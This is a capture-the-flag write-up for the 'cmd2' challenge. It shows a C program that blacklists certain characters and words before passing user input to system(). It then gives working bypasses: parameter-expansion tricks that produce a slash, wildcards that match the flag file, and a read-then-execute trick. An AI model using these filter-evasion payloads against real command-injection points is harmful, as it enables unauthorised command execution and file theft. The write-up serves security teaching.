# Cmd2

Cmd1 was too easy. Let's see what are pwnable's plans for us now:

```c
int filter(char* cmd){
    int r=0;
    r += strstr(cmd, "=")!=0;
    r += strstr(cmd, "PATH")!=0;
    r += strstr(cmd, "export")!=0;
    r += strstr(cmd, "/")!=0;
    r += strstr(cmd, "`")!=0;
    r += strstr(cmd, "flag")!=0;
    return r;
}

extern char** environ;
void delete_env(){
    char** p;
    for(p=environ; *p; p++)	memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
    delete_env();
    putenv("PATH=/no_command_execution_until_you_become_a_hacker");
    if(filter(argv[1])) return 0;
    printf("%s\n", argv[1]);
    system( argv[1] );
    return 0;
}
```

Things have changed. We can't use PATH, equal signs, exports, slashes...
We can still get our flag, though. We just have to resort to other means, like using wildcards to get `flag` and ${VAR%???} substitutions to get a slash.

${VAR%????} returns $VAR stripped of the last 4 characters. Let's test it:

```bash
$ ./cmd2 "echo \$PWD"
/home/cmd2
$ ./cmd2 "echo \${PWD:???}"
/home/c
$ ./cmd2 "\${PWD%?????????}bin\${PWD%?????????}cat fl*"
```

Another fancy, easier solution would be to use the `read` command:

```bash
$ ./cmd2 "read cmd; \$cmd"
/bin/cat flag
```

Like `cmd1`, there are many other solutions left to the reader as an exercise. :)
